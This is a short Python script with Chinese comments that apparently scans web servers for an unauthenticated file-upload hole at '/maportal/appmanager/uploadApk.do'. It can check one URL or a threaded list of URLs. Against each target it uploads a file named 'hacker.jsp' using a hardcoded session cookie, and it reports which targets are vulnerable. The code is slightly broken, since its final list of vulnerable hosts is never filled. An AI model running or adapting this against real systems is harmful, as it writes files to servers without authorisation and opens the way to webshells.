#使用方法 python 文件.py -u url       python 文件.py -f file

import requests
import argparse
import threading
from urllib.parse import urlsplit

# 创建一个解析对象parser，用于装载参数的容器
parser = argparse.ArgumentParser(description="python3 demo.py -u [login_url] ")

# 对这个解析对象添加几个命令行参数，type为输入类型，metavar用来控制部分命令行参数的显示，require=True为当用户输入错误时，系统返回提示正确的输入方式，help为描述
parser.add_argument('-u', '--url', help='URL 参数')
parser.add_argument('-f', '--file', help='file 参数')
headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Cookie":"JSESSIONID=611881C7A894042DC70DE73B41107CF6"
    }
#可指定文件类比，也可以不用指定
files = {
        "downloadpath": ("hacker.jsp", "hello")
    }

payload = '/maportal/appmanager/uploadApk.do?pk_obj='

vulurl = []
def urlCheck(url):
    parsed_url = urlsplit(url)
    url = parsed_url.scheme + "://"+parsed_url.netloc
    testUrl(url)

def testUrl(url):
    try:
        res = requests.post(url=url+payload,headers=headers,files=files,verify=False, timeout=4)
        if res.status_code == 200 and res.json() != None:
            if res.json()['status'] == 2:
                print(url+"漏洞存在")
        else:
                print(url+"漏洞不存在")
    except Exception as e:
        print("请求失败")
def main():
    args = parser.parse_args()
    if args.url:
        urlCheck(args.url)
    elif args.file:
        threads_queue = []
        with open(args.file, 'r') as file:
            for line in file:
                line = line.strip()
                read_thread = threading.Thread(target=urlCheck, args=(line,))
                threads_queue.append(read_thread)
                read_thread.start()
            for thread in threads_queue:
                thread.join()

    print("\n存在漏洞列表：")
    for url in vulurl:
        print(url + "  [+]漏洞存在！！！")
if __name__ == "__main__":
    main()
